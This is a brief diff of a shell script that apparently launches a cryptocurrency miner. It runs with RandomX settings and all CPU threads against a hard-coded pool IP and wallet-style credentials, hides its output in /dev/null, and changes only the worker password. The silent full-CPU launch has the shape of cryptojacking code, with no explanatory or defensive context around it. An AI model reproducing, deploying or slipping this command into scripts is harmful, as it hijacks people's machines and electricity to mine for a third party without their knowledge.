@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 104.237.141.187:8088 -u solo:Q010500969d625ddf93f8a33bca9ee3fd2803b4bd4afa23e61c7f623156dd7aec0ad87ed24bf98c -p LN1703 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 104.237.141.187:8088 -u solo:Q010500969d625ddf93f8a33bca9ee3fd2803b4bd4afa23e61c7f623156dd7aec0ad87ed24bf98c -p LN1733 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
